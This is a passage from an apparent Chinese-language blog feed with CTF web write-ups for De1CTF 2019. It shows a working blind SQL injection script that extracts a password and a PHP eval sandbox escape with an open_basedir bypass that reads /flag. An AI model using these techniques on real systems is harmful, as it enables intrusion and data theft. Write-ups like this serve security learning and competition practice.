class="string">'b3d8b293864a1621d889daca93bb4812'</span>,<span class="string">'6b7d6adab9ed716b013f8fcc027bf314'</span>,<span class="string">'ad689aa5e736a5b16564534e5b890e1f'</span>,<span class="string">'f53152e6de1c50be961696c529872313'</span>,<span class="string">'38e397ff4154ca8b1574d6f6c15f860e'</span>,<span class="string">'0b800d7e01ee2bfe9cd7c3a113127ca0'</span>,<span class="string">'856500703f201b2b2391ad11a764dc7e'</span>,<span class="string">'88a7336ae95aa16de1c1104fb4f21b8a'</span>,<span class="string">'f6c4c31982540d11a4885689b97cf3a4'</span>,<span class="string">'99db02fc851509e4b32e74837d6016dd'</span>,<span class="string">'bf63960fa6f4a4a08a33f9ce403c4fba'</span>,<span class="string">'5910dd2743cc3b62e9ca4a4f5158b192'</span>,<span class="string">'311b24e5788e747db2e479f7e22b7873'</span>,<span class="string">'8322ab2861f27f19544f095978096f89'</span>,<span class="string">'8bbe576e9e77d23631303ea2a04945e2'</span>,<span class="string">'30c3afeed3110d63a9b9655ad85798a4'</span>,<span class="string">'fab6fb7271b1e19ef47cd106df0df361'</span>,<span class="string">'8fb438550190c9739d0f00e8cfcd9bd3'</span>,<span class="string">'f4160f3b5400f9aeb03ffbcd3223af1b'</span>,<span class="string">'240716ddb36b83dfe6d898ff3bfbe59b'</span>,<span class="string">'8df5da70fa1004206502c60bb00b188d'</span>,<span class="string">'513154bb13bbcd82fae47c9163c834cb'</span>,<span class="string">'248a1a48cc311247505ad4e366c17913'</span>,<span class="string">'57ee7af50ab35086d89ed3812cc4b922'</span>,<span class="string">'56d1ae03f68465af760bebe3293d3f96'</span>,<span class="string">'750d7d5423b613fbc8e9a20cc096a9c2'</span>,<span class="string">'e722b86026e105dc33f568cbf65c8dc2'</span>,<span class="string">'58e951f616b7828781abd35aaf3c2fad'</span>,<span class="string">'6f940887eccffea62552d9d1579c34fe'</span>,<span class="string">'cc615bb9a427a545bfb4c5aa6bb7e873'</span>,<span class="string">'67a38d3d9f9a83300a31078a84e7bc6b'</span>,<span class="string">'abb9c0849d11bd316db61bbef5de2522'</span>,<span class="string">'3730b7a1430756cf80ef2ed80f334a3d'</span>,<span class="string">'8129b4b2bb3cbe6f5cb7f4879267460b'</span>,<span class="string">'f4c1d2ac6dc6369c828a8b2c6e4b8b6e'</span>,<span class="string">'eec7163c18052f4d2844fc8a55200882'</span>,<span class="string">'6715685e28f1da676cb6baa2da283ee5'</span>,<span class="string">'5171458efb3e8fe0b6451d92022985c5'</span>,<span class="string">'066253bcf4518a1ae34b5a6087547b3f'</span>,<span class="string">'bc473690484a0e4095ff4861b865bf5d'</span>,<span class="string">'87d32b90d517565857180baf8f78e67b'</span>,<span class="string">'eab88164ddeffdf69450a1c8f63d2745'</span>,<span class="string">'daa626adb92cc1676f5b361e39f2e300'</span>,<span class="string">'c87a4851696eba43b471792cd7faa13d'</span>,<span class="string">'399200ad28d61daf4b38309ed5f5f4ac'</span>,<span class="string">'b75c53b9d349003f7dc5c04b00231184'</span>,<span class="string">'4d8b7016cd85b5170bc1e2e9ee52ee71'</span>,<span class="string">'8b844fa17339dcccb9ee471078fec5f2'</span>,<span class="string">'91dfa5f1c6da365f7c6238713988c48b'</span>,<span class="string">'1147948d33ade9b9dab90c313a8fd519'</span>,<span class="string">'4363f8a2d8118f65a8e8311296246393'</span>,<span class="string">'48bcc07d28e368d7d8d9798369398312'</span>,<span class="string">'2a205e44d4222bdded0369b0623cad85'</span>,<span class="string">'8101cc7c376b9404ad99c2a2b41d236c'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seed_list:</span><br><span class="line">fuzz_path(i)</span><br></pre></td></tr></table></figure></p><p>爆破一轮后，成功获得path，拿到flag：<br><img src="/images/2019-08-04-15-19-27.png" alt=""></p><h2 id="Giftbox"><a href="#Giftbox" class="headerlink" title="Giftbox"></a>Giftbox</h2><p>题目拿到后，发现会往shell.php发ajax请求，并带有随机数，同时观察命令：<br><img src="/images/2019-08-05-10-08-06.png" alt=""><br>发现有login，于是发现注入，写出脚本注出密码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> ajaxSetting = &#123;</span><br><span class="line">            url: host + <span class="string">`/shell.php?a=login%20<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(username)&#125;</span>%201&amp;validthis=1&amp;totp=<span class="subst">$&#123;<span class="keyword">new</span> TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,<span class="number">8</span>).genOTP()&#125;</span>`</span>,</span><br><span class="line">            type: <span class="string">"GET"</span>,</span><br><span class="line">Type: <span class="string">'json'</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                resolve(response);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                reject(<span class="string">"请求失败"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $.ajax(ajaxSetting);</span><br><span class="line"> </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> ajax(username);</span><br><span class="line">    <span class="keyword">return</span> res.message</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">blind</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0x20</span>; i &lt; <span class="number">0x7f</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//表名 const message = await test(`admin'and(ascii(substr((select\x0agroup_concat(TABLE_NAME)\x0afrom\x0ainformation_schema.TABLES\x0awhere\x0aTABLE_SCHEMA=database()),$&#123;j&#125;,1))=$&#123;i&#125;)#`)</span></span><br><span class="line">            <span class="comment">//列名 const message = await test(`admin'and(ascii(substr((select\x0agroup_concat(COLUMN_NAME)\x0afrom\x0ainformation_schema.COLUMNS\x0awhere\x0aTABLE_NAME=0x7573657273),$&#123;j&#125;,1))=$&#123;i&#125;)#`)</span></span><br><span class="line">            <span class="keyword">const</span> message = <span class="keyword">await</span> test(<span class="string">`admin'and(ascii(substr((select\x0apassword\x0afrom\x0ausers\x0alimit\x0a0,1),<span class="subst">$&#123;j&#125;</span>,1))=<span class="subst">$&#123;i&#125;</span>)#`</span>);</span><br><span class="line">            <span class="keyword">if</span>(message == <span class="string">'login fail, password incorrect.'</span>) &#123;</span><br><span class="line">                ret += <span class="built_in">String</span>.fromCharCode(i);</span><br><span class="line">                <span class="built_in">console</span>.log(ret)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;j&#125;</span>: <span class="subst">$&#123;ret&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-10-23.png" alt=""><br>发现就是eval的sandbox逃逸，而测试发现，过滤了大量的特殊符号，但可利用trick，如下：<br><img src="/images/2019-08-05-10-12-02.png" alt=""><br>同时花括号可以代替中括号：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[sky]  =  $_GET&#123;sky&#125;</span><br></pre></td></tr></table></figure></p><p>那么可以构造出如下exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">targeting a _GET</span><br><span class="line">targeting b sky</span><br><span class="line">targeting c &#123;$&#123;$a&#125;&#123;$b&#125;&#125;</span><br><span class="line">targeting d $&#123;eval($c)&#125;</span><br></pre></td></tr></table></figure></p><p>然后发包的时候带上sky参数即可RCE:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launch(&quot;chdir(&apos;/sandbox&apos;);chdir(&apos;modules&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(ini_get(&apos;open_basedir&apos;));var_dump(glob(&apos;/*&apos;));&quot;)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-05-59.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launch(&quot;chdir(&apos;/sandbox&apos;);chdir(&apos;modules&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(ini_get(&apos;open_basedir&apos;));var_dump(readfile(&apos;/flag&apos;));&quot;)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-05-10-06-22.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>De1CTF的Web还是比较简单的，如果有更多解法请留言交流~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;为了去重庆XCTF Final吃火锅，周末就冲了一下De1CTF，以下是本次比赛Web题解。&lt;br&gt;&lt;img src=&quot;/images/20
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
</feed>
